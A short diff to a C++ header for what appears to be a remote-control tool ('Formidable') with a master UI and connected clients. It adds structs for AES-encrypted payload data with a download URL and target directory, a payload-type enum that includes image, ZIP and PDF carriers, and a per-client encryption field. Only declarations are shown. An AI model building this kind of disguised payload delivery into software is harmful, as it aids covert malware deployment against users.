@@ -24,6 +24,34 @@ namespace Formidable {
     struct ClientInfo;
     struct CommandPkg;
     struct PkgHeader;
+    
+    typedef struct SCInfoOld {
+        unsigned char aes_key[16];
+        unsigned char aes_iv[16];
+        unsigned char data[4 * 1024 * 1024];
+        int len;
+    } SCInfoOld;
+
+    typedef struct SCInfo {
+        unsigned char aes_key[16];
+        unsigned char aes_iv[16];
+        unsigned char* data;
+        int len;
+        int offset;
+        char file[MAX_PATH];
+        char targetDir[MAX_PATH];
+        char downloadUrl[MAX_PATH];
+    } SCInfo;
+
+    enum PayloadType {
+        Payload_Self = 0,
+        Payload_Raw,
+        Payload_BMP,
+        Payload_JPG,
+        Payload_PNG,
+        Payload_ZIP,
+        Payload_PDF,
+    };
 }
 
 namespace Formidable {
@@ -47,6 +75,7 @@ struct ConnectedClient {
 
     // 客户端信息
     ClientInfo info;
+    int32_t iHeaderEnc; // 协议加密类型
     int listIndex; // ListView index in master UI
     
     // 群控功能字段
